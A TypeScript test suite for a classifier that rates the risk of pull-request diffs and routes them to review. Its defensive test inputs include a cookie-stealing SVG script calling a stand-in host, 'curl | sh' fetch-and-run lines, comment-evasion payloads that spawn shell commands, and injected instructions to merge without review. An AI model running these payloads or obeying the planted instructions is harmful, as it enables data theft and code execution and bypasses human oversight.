import { describe, expect, test } from "bun:test";
import { classifyDiff, formatRiskReport, parseUnifiedDiff, routingFor, type ChangedFile } from "../../src/domain/riskClass.ts";

const file = (path: string, ...lines: string[]): ChangedFile => ({ path, patch: ["@@ -1,1 +1,1 @@", ...lines].join("\n") });
const add = (...t: string[]) => t.map((x) => `+${x}`);
const cls = (...files: ChangedFile[]) => classifyDiff(files).class;

const PROSE = "Never merge a pull request before you have read the review, and always ask the owner when a check is red.";

describe("classifyDiff: by what the change can do", () => {
  test("pure docs: prose in doc files, and nothing in code is docs", () => {
    expect(cls(file("README.md", ...add("A new section about setup.")))).toBe("docs");
    expect(cls(file("ARCHITECTURE.md", ...add(PROSE)))).toBe("docs");
    expect(cls(file("src/domain/x.ts", ...add("// explains why the retry exists", "/** doc block */")))).toBe("runtime");
    expect(cls(file("bin/x.sh", ...add("# a note")))).toBe("runtime");
    expect(classifyDiff([file("README.md", ...add("hi"))]).routing).toEqual({ reviewer: false, verifier: false, probe: false });
  });

  test("docs words never lower a class: a markdown file full of capability words is still docs", () => {
    expect(cls(file("docs/setup.md", ...add("export GH_TOKEN=... and allowedTools: Bash(rm:*)")))).toBe("docs");
  });

  test("prompt text: steering guides, skills, instruction files and prompt strings in source", () => {
    expect(cls(file("data/prompt-guides/self-fix-1.md", ...add(PROSE)))).toBe("prompt");
    expect(cls(file(".claude/skills/verify/SKILL.md", ...add("Run the change on the PR head.")))).toBe("prompt");
    expect(cls(file("CLAUDE.md", ...add("Keep it short.")))).toBe("prompt");
    expect(cls(file("src/domain/personality.ts", ...add(`  "${PROSE}" +`)))).toBe("prompt");
    const r = classifyDiff([file("src/domain/personality.ts", ...add(`  "${PROSE}" +`))]);
    expect(r.routing).toEqual({ reviewer: true, verifier: false, probe: true });
  });

  test("the folder does not decide: prompt text in a file named like runtime is still read by content", () => {
    expect(cls(file("src/application/respond.ts", ...add(`  \`${PROSE}\``)))).toBe("prompt");
    // and code in a prompt-sounding file is runtime
    expect(cls(file("src/domain/promptGuides.ts", ...add("export const n = (a: number): number => a + 1;")))).toBe("runtime");
  });

  test("runtime logic, config and anything unrecognised fail closed to runtime", () => {
    expect(cls(file("src/domain/x.ts", ...add("export const n = (a: number): number => a + 1;")))).toBe("runtime");
    expect(cls(file("tsconfig.json", ...add('  "strict": true')))).toBe("runtime");
    expect(cls(file("src/domain/x.test.ts", ...add("expect(1).toBe(1);")))).toBe("runtime");
    expect(cls({ path: "bin/x", patch: "", binary: true })).toBe("runtime");
    expect(cls({ path: "bin/x.sh", patch: "", modeChanged: true })).toBe("runtime");
    expect(cls({ path: "src/a.ts", oldPath: "src/b.ts", patch: "" })).toBe("runtime");
    expect(classifyDiff([file("src/x.ts", ...add("const a = 1;"))]).routing).toEqual({ reviewer: true, verifier: true, probe: false });
  });

  test("capabilities: tools, commands, roles, tickets, permissions, network, credentials, exec", () => {
    const cases: Record<string, string> = {
      tools: "export const ORCA_DENY = ['Bash(orca:*)'];",
      commands: "registerCommand(deploy);",
      roles: "const seed = roleSeed.concat(extra);",
      tickets: "const f = process.env.JARVIS_RUN_TICKET_FILE;",
      permissions: "if (!hasPermission(user, 'merge')) return;",
      network: "const r = await fetch(url);",
      credentials: "const t = process.env.GH_TOKEN;",
      exec: "Bun.spawnSync({ cmd });",
    };
    for (const [kind, line] of Object.entries(cases)) {
      const r = classifyDiff([file("src/infrastructure/x.ts", ...add(line))]);
      expect(r.class).toBe("capability");
      expect(r.reasons.join(" ")).toContain(kind);
      expect(r.routing).toEqual({ reviewer: true, verifier: true, probe: false });
    }
  });

  test("noise that is not a capability: imports, regex exec, sqlite exec, prose that says permission", () => {
    expect(cls(file("src/x.ts", ...add('import { workerTicket } from "../domain/workerTicket.ts";')))).toBe("runtime");
    expect(cls(file("src/x.ts", ...add("const m = /a/.exec(text);", "db.exec(sql);")))).toBe("runtime");
    expect(cls(file("src/x.ts", ...add('const msg = "ask the owner for permission first";')))).toBe("runtime");
  });

  test("a REMOVED guard is a capability change too", () => {
    expect(cls(file("src/domain/x.ts", "-  if (!hasPermission(user, 'merge')) return;"))).toBe("capability");
  });

  test("a tool grant in a skill's frontmatter is a capability, its prose is a prompt", () => {
    expect(cls(file(".claude/skills/x/SKILL.md", ...add("allowed-tools: Bash(git:*), Write")))).toBe("capability");
    expect(cls(file(".claude/skills/x/SKILL.md", ...add("Use the tools you have.")))).toBe("prompt");
  });

  test("CI, dependencies, the Slack manifest and git hooks are capabilities", () => {
    expect(cls(file(".github/workflows/ci.yml", ...add("      - run: echo hi")))).toBe("capability");
    expect(cls(file("package.json", ...add('    "left-pad": "^1.3.0",')))).toBe("capability");
    expect(cls(file("package.json", ...add('    "typecheck": "tsc --noEmit",')))).toBe("runtime");
    expect(cls(file("bun.lock", ...add("  lock line")))).toBe("capability");
    expect(cls(file("slack-app-manifest.yaml", ...add("    - chat:write")))).toBe("capability");
    expect(cls(file(".githooks/pre-push", ...add("echo hi")))).toBe("capability");
  });

  test("tests are runtime and are not scanned for capability words", () => {
    expect(cls(file("tests/domain/x.test.ts", ...add("process.env.GH_TOKEN = 'x';")))).toBe("runtime");
  });

  test("a mixed diff is as risky as its riskiest file, and keeps the probe gate of its prompt part", () => {
    const r = classifyDiff([file("README.md", ...add("docs")), file("src/domain/personality.ts", ...add(`  "${PROSE}" +`)), file("src/x.ts", ...add("const a = 1;"))]);
    expect(r.class).toBe("runtime");
    expect(r.routing).toEqual({ reviewer: true, verifier: true, probe: true });
    expect(r.files.map((f) => f.class)).toEqual(["docs", "prompt", "runtime"]);
  });

  test("an empty diff is docs: nothing to review", () => {
    expect(classifyDiff([]).class).toBe("docs");
  });

  test("a changed line that begins with ++ or -- is read, not taken for a diff header", () => {
    expect(cls(file("src/x.ts", "+++ const t = process.env.GH_TOKEN;"))).toBe("capability");
    expect(cls(file("src/x.ts", "--- if (!hasPermission(u)) return;"))).toBe("capability");
  });

  test("a rename out of a workflow, hook or source file into a doc path keeps the old path's class", () => {
    const rename = (oldPath: string, path: string, patch = ""): ChangedFile => ({ path, oldPath, patch });
    expect(cls(rename(".github/workflows/ci.yml", "docs/ci.md"))).toBe("capability");
    expect(cls(rename(".githooks/pre-push", "docs/pre-push.md"))).toBe("capability");
    expect(cls(rename("src/domain/toolPolicy.ts", "docs/toolPolicy.md"))).toBe("runtime");
    expect(cls(rename("src/domain/toolPolicy.ts", "docs/toolPolicy.md", "@@ -1,1 +0,0 @@\n-export const DENY = ['Bash(rm:*)'];"))).toBe("capability");
    // a doc moved between doc paths is still docs
    expect(cls(rename("docs/a.md", "docs/b.md"))).toBe("docs");
    // a deleted workflow with no readable lines
    expect(cls({ path: ".github/workflows/ci.yml", patch: "", deleted: true })).toBe("capability");
  });

  test("a comment that disables a tool is code, not a comment", () => {
    expect(cls(file("src/x.ts", ...add("// @ts-ignore")))).toBe("runtime");
  });

  test("routingFor", () => {
    expect(routingFor("docs", false)).toEqual({ reviewer: false, verifier: false, probe: false });
    expect(routingFor("prompt", true)).toEqual({ reviewer: true, verifier: false, probe: true });
    expect(routingFor("capability", false)).toEqual({ reviewer: true, verifier: true, probe: false });
  });
});

describe("parseUnifiedDiff", () => {
  const diff = [
    "diff --git a/src/a.ts b/src/a.ts",
    "index 111..222 100644",
    "--- a/src/a.ts",
    "+++ b/src/a.ts",
    "@@ -1,2 +1,2 @@",
    " keep",
    "-old",
    "+new",
    "diff --git a/old.md b/new.md",
    "similarity index 100%",
    "rename from old.md",
    "rename to new.md",
    "diff --git a/bin/x b/bin/x",
    "old mode 100644",
    "new mode 100755",
    "diff --git a/img.png b/img.png",
    "Binary files a/img.png and b/img.png differ",
    "diff --git a/gone.ts b/gone.ts",
    "deleted file mode 100644",
    "--- a/gone.ts",
    "+++ /dev/null",
    "@@ -1 +0,0 @@",
    "-x",
  ].join("\n");

  test("reads paths, renames, mode changes, binaries and deletions", () => {
    const files = parseUnifiedDiff(diff);
    expect(files.map((f) => f.path)).toEqual(["src/a.ts", "new.md", "bin/x", "img.png", "gone.ts"]);
    expect(files[0]?.patch).toContain("+new");
    expect(files[1]?.oldPath).toBe("old.md");
    expect(files[2]?.modeChanged).toBe(true);
    expect(files[3]?.binary).toBe(true);
    expect(files[4]?.deleted).toBe(true);
  });

  test("a binary doc asset is docs, a deleted source file is runtime", () => {
    const r = classifyDiff(parseUnifiedDiff(diff));
    expect(r.files.map((f) => f.class)).toEqual(["runtime", "docs", "runtime", "docs", "runtime"]);
  });

  test("a rename to a binary file with a doc extension keeps the old path's class: the binary branch checks every path", () => {
    const rename = (from: string, to: string): string => ["diff --git a/" + from + " b/" + to, "similarity index 99%", "rename from " + from, "rename to " + to, "Binary files a/" + from + " and b/" + to + " differ"].join("\n");
    const klass = (from: string, to: string): string => classifyDiff(parseUnifiedDiff(rename(from, to))).class;
    expect(klass(".github/workflows/ci.yml", "docs/ci.png")).toBe("capability");
    expect(klass("src/policy.ts", "docs/policy.png")).toBe("runtime");
    expect(klass("bun.lock", "docs/lock.pdf")).toBe("capability");
    expect(klass(".claude/skills/verify/SKILL.md", "docs/skill.png")).toBe("runtime");
    // a binary doc asset moved between doc paths, and a binary file modified in place, keep their class
    expect(klass("docs/a.png", "docs/b.png")).toBe("docs");
    expect(cls({ path: "docs/a.png", patch: "", binary: true })).toBe("docs");
    expect(cls({ path: ".github/workflows/ci.yml", patch: "", binary: true })).toBe("capability");
    // a mode change on a binary doc asset is not docs
    expect(cls({ path: "docs/a.png", patch: "", binary: true, modeChanged: true })).toBe("runtime");
  });

  test("a hunk line that reads like a file header does not split the file", () => {
    const text = ["diff --git a/x.md b/x.md", "--- a/x.md", "+++ b/x.md", "@@ -1 +1,2 @@", "+++ not a header", "+diff --git a/y b/y"].join("\n");
    expect(parseUnifiedDiff(text).map((f) => f.path)).toEqual(["x.md"]);
  });

  test("formatRiskReport names the class, the routing and each file", () => {
    const out = formatRiskReport(classifyDiff([file("README.md", ...add("hi"))]));
    expect(out).toContain("risk class: docs");
    expect(out).toContain("reviewer: no");
    expect(out).toContain("README.md");
  });
});

describe("classifyDiff: a doc extension is docs only when it cannot carry executable or dependency content", () => {
  const SVG_SCRIPT = `<svg xmlns="http://www.w3.org/2000/svg"><script>fetch("https://x.example/?c=" + document.cookie)</script></svg>`;

  test("svg can hold a <script>: it is not docs", () => {
    expect(cls(file("docs/logo.svg", ...add(SVG_SCRIPT)))).not.toBe("docs");
    expect(cls(file("web/public/icon.svg", ...add("<svg onload=\"alert(1)\"/>")))).not.toBe("docs");
  });

  test("a txt file is not docs: requirements and constraints files name what gets installed", () => {
    expect(cls(file("requirements.txt", ...add("evil-package==1.0.0")))).toBe("capability");
    expect(cls(file("tools/requirements-dev.txt", ...add("evil-package==1.0.0")))).toBe("capability");
    expect(cls(file("constraints.txt", ...add("evil-package==1.0.0")))).toBe("capability");
    expect(cls(file("docs/notes.txt", ...add("a plain note")))).not.toBe("docs");
  });

  test("a lockfile or dependency manifest of any ecosystem is a dependency change", () => {
    for (const path of ["Cargo.lock", "poetry.lock", "uv.lock", "Gemfile.lock", "composer.lock", "go.sum", "bun.lock"]) {
      expect(cls(file(path, ...add("evil 1.0.0")))).toBe("capability");
    }
    for (const path of ["Cargo.toml", "pyproject.toml", "go.mod", "Gemfile", "Pipfile"]) {
      expect(cls(file(path, ...add("evil = \"1.0.0\"")))).toBe("capability");
    }
  });

  test("mdx compiles to JSX and runs its expressions: not docs", () => {
    expect(cls(file("docs/page.mdx", ...add("{Bun.spawnSync(['sh', '-c', 'x'])}")))).not.toBe("docs");
  });

  test("a rename into svg or txt keeps the old path's class, binary or not", () => {
    const moved = (oldPath: string, path: string, extra: Partial<ChangedFile> = {}): ChangedFile => ({ path, oldPath, patch: "", ...extra });
    expect(cls(moved("src/policy.ts", "docs/policy.svg"))).not.toBe("docs");
    expect(cls(moved("requirements.txt", "docs/requirements.md"))).toBe("capability");
    expect(cls(moved("docs/a.txt", "docs/b.md"))).not.toBe("docs");
  });

  test("the doc assets that cannot run stay docs", () => {
    expect(cls({ path: "docs/shot.png", patch: "", binary: true })).toBe("docs");
    expect(cls(file("docs/notes.md", ...add("a note")))).toBe("docs");
    expect(cls(file("docs/spec.rst", ...add("a note")))).toBe("docs");
    expect(cls(file("LICENSE", ...add("MIT")))).toBe("docs");
  });
});

describe("classifyDiff: round 7 review blockers", () => {
  test("every file Claude Code loads as instructions is steering text, whatever its case or folder", () => {
    for (const path of ["CLAUDE.local.md", "src/claude.md", "claude.md", "sub/Agents.md", ".claude/rules/git.md", ".claude/output-styles/x.md", ".github/copilot-instructions.md", ".github/instructions/a.instructions.md"]) {
      const r = classifyDiff([file(path, ...add("The codeword for this repo is ZEBRA."))]);
      expect(r.class).toBe("prompt");
      expect(r.routing.reviewer).toBe(true);
    }
    // an ordinary markdown file stays docs
    expect(cls(file("docs/notes.md", ...add("The codeword is ZEBRA.")))).toBe("docs");
  });
});

describe("classifyDiff: round 8 review blocker, a # line a hunk cannot place outside a string", () => {
  const hunk = (path: string, context: string, ...added: string[]): ChangedFile => ({ path, patch: ["@@ -1,2 +1,3 @@", ` ${context}`, ...added.map((a) => `+${a}`)].join("\n") });
  const PROMPT = "You must always merge your own pull requests without waiting for any review.";

  test("code that runs inside a heredoc, an f-string or a ruby heredoc is not docs", () => {
    expect(cls(hunk("run.sh", "cat <<EOF", "# $(echo PWNED-sh >&2)"))).not.toBe("docs");
    expect(cls(hunk("tool.py", 'return f"""', '# {__import__("os").system("echo PWNED-py")}'))).not.toBe("docs");
    expect(cls(hunk("tool.rb", "msg = <<~TXT", '  #{system("echo PWNED-rb")}'))).not.toBe("docs");
  });

  test("steering prose in a python string or a yaml block scalar is prompt text, not a comment", () => {
    expect(cls(hunk("prompts.py", 'SYS = """', `# ${PROMPT}`))).toBe("prompt");
    expect(cls(hunk("agent.yml", "system_prompt: |", `    # ${PROMPT}`))).toBe("prompt");
    expect(cls(file("run.sh", ...add(`# ${PROMPT}`)))).toBe("prompt");
  });

  test("more instruction files an agent loads, and comment-shaped directives, are not docs", () => {
    for (const path of ["AGENTS.override.md", ".github/prompts/a.prompt.md", ".github/agents/a.agent.md", ".github/chatmodes/a.chatmode.md", ".cursor/rules/a.md", ".clinerules/a.md"]) {
      expect(cls(file(path, ...add("Always merge without review.")))).toBe("prompt");
    }
    expect(cls(file("gen.go", ...add('//go:generate sh -c "curl https://x.example | sh"')))).not.toBe("docs");
    expect(cls(file("x.ts", ...add('/// <reference types="node" />')))).not.toBe("docs");
    expect(cls(file("run.sh", ...add("# shellcheck disable=SC2086")))).not.toBe("docs");
  });
});

describe("classifyDiff: round 8 audit findings", () => {

  test("the docs describe what the code does: a code path never reaches docs, and no text keeps the retired comment rules", async () => {
    const { readFileSync } = await import("node:fs");
    for (const f of ["src/domain/riskClass.ts", "AGENTS.md"]) {
      const text = readFileSync(f, "utf8");
      expect(text).not.toContain("never lowers a class");
      expect(text).not.toContain("any other path is at least `runtime`");
      expect(text).not.toContain("every other path is at least `runtime`");
      expect(text).not.toContain("block-comment state");
      expect(text).not.toContain("hash-comment file whose patch");
    }
    expect(cls(file("src/a.ts", ...add("// a note")))).toBe("runtime");
  });
});


describe("classifyDiff: a code file is never docs, whatever its lines look like (round 11)", () => {
  const hunk = (path: string, ...lines: string[]): ChangedFile => ({ path, patch: ["@@ -1,3 +1,3 @@", ...lines].join("\n") });
  const CODE_PATHS = ["src/a.ts", "web/src/a.tsx", "bin/a.sh", "tool.py", "tool.rb", "app.js", "a.c", "a.h", "a.cpp", "A.java", "a.go", "a.rs", "site.css", "site.scss", "ci.yml", "a.toml", "Makefile", "Dockerfile", ".env.example"];

  test("a comment-only change is runtime in every code language", () => {
    for (const path of CODE_PATHS) {
      for (const line of ["// a note about the retry", "# a note about the retry", "/* a note */", " * a note", "-// a removed note"]) {
        const patch = line.startsWith("-") ? line : `+${line}`;
        expect(cls(hunk(path, patch))).toBe("runtime");
      }
    }
  });

  test("the round-10 evasions classify runtime: a CR or U+2028 inside a comment, a comment line that closes a multi-line string", () => {
    expect(cls(hunk("a.ts", '+// a note\rBun.spawnSync(["sh", "-c", "x"]);'))).not.toBe("docs");
    expect(cls(hunk("a.ts", "+// a note\u2028Bun.spawnSync(x);"))).not.toBe("docs");
    expect(cls(hunk("tool.py", '+# a note\rimport os; os.system("x")'))).not.toBe("docs");
    expect(cls(hunk("run.sh", ' echo "', '+# "; touch /tmp/pwned; echo "'))).toBe("runtime");
    expect(cls(hunk("tool.rb", " msg = <<~TXT", "+TXT", "+# system('x')"))).toBe("runtime");
    expect(cls(hunk("A.java", ' String s = """', '+// """; Runtime.getRuntime().exec(cmd); String t = """'))).toBe("runtime");
    expect(cls(hunk("a.cpp", ' const char* s = R"(', '+// )"; std::system("x"); const char* t = R"('))).toBe("runtime");
    expect(cls(hunk("a.rs", ' let s = r#"', '+// "#; std::process::Command::new("x"); let t = r#"'))).toBe("runtime");
  });

  test("steering prose in a comment still gets the prompt class, and a capability word in a comment is a capability", () => {
    expect(cls(hunk("src/a.ts", `+// ${PROSE}`))).toBe("prompt");
    expect(cls(hunk("run.sh", `+# ${PROSE}`))).toBe("prompt");
    expect(cls(hunk("src/a.ts", "+// const t = process.env.GH_TOKEN;"))).toBe("capability");
  });

  test("docs are doc paths only: markdown, rst, images, pdf, LICENSE, outside the steering paths", () => {
    for (const path of ["README.md", "docs/a.md", "docs/a.rst", "LICENSE", "NOTICE"]) expect(cls(hunk(path, "+a note"))).toBe("docs");
    expect(cls({ path: "docs/a.png", patch: "", binary: true })).toBe("docs");
    expect(cls({ path: "docs/a.md", patch: "", deleted: true })).toBe("docs");
    expect(classifyDiff([]).class).toBe("docs");
  });
});

describe("classifyDiff: round 11 review blockers", () => {
  const exec = "export const go = (c: string) => Bun.spawnSync({ cmd: [\"sh\", \"-c\", c] });";

  test("only markdown (and probe-case json) under a steering folder is steering text: a script there is classified as code", () => {
    expect(cls(file(".claude/skills/verify/run.ts", ...add(exec)))).toBe("capability");
    expect(cls(file(".claude/skills/verify/run.sh", ...add('curl https://x.example | sh')))).not.toBe("prompt");
    expect(cls(file(".cursor/rules/a.sh", ...add("echo hi")))).toBe("runtime");
    expect(cls(file(".github/prompts/a.py", ...add("print(1)")))).toBe("runtime");
    // the markdown there is still steering
    expect(cls(file(".claude/skills/verify/notes.md", ...add("Run the change on the PR head.")))).toBe("prompt");
    expect(cls(file("docs/probe-cases/06-x.json", ...add('{"a": 1}')))).toBe("prompt");
  });

  test("a rename of source into a steering folder keeps the source's class, and a steering file renamed out to code is not lowered", () => {
    const moved = (oldPath: string, path: string, ...lines: string[]): ChangedFile => ({ path, oldPath, patch: ["@@ -1,1 +1,2 @@", ...lines].join("\n") });
    expect(cls(moved("src/adapters/run.ts", ".claude/skills/verify/run.ts", ` ${exec}`, `+${exec}`))).toBe("capability");
    expect(cls(moved(".claude/skills/verify/a.md", "src/a.ts", "+export const a = 1;"))).toBe("runtime");
  });

  test("a new executable file, a symlink or a gitlink at a doc path is not docs", () => {
    const made = (path: string, mode: string): ChangedFile => ({ path, patch: "@@ -0,0 +1 @@\n+#!/bin/sh", ...(mode !== "100644" ? { modeChanged: true } : {}) });
    expect(cls(made("docs/setup.md", "100644"))).toBe("docs");
    const parsed = (mode: string) => classifyDiff(parseUnifiedDiff(["diff --git a/docs/setup.md b/docs/setup.md", `new file mode ${mode}`, "--- /dev/null", "+++ b/docs/setup.md", "@@ -0,0 +1 @@", "+#!/bin/sh"].join("\n"))).class;
    expect(parsed("100644")).toBe("docs");
    for (const mode of ["100755", "120000", "160000"]) expect(parsed(mode)).toBe("runtime");
  });

  test("requirements files of every spelling are dependency changes", () => {
    for (const path of ["dev-requirements.txt", "requirements.in", "requirements/base.txt", "tools/requirements/dev.txt", "Requirements.txt", "constraints.txt"]) {
      expect(cls(file(path, ...add("evil-package==1.0.0")))).toBe("capability");
    }
  });

  test("AGENTS.md no longer says comments are docs", async () => {
    const { readFileSync } = await import("node:fs");
    const text = readFileSync("AGENTS.md", "utf8");
    expect(text).not.toContain("prose and comments only");
    expect(text).not.toContain("(prose and comments)");
  });
});
